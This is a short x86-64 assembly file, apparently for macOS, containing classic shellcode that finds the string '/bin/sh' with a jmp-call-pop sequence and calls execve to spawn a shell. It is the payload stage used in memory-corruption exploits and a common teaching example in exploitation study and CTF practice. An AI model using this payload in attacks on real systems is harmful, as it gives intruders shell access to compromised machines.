section .text
global start

start:
	jmp short binsh

; execve("/bin/sh", 0,  0)
; rax    rdi        rsi rdx
shellcode:
	pop rdi

	; 2 << 24 + 0x3b
	xor rax, rax
	mov al, 2
	shl rax, 24
	add al, 0x3b

	xor rsi, rsi
	xor rdx, rdx

	syscall
	ret

binsh:
	call shellcode
	db '/bin/sh'

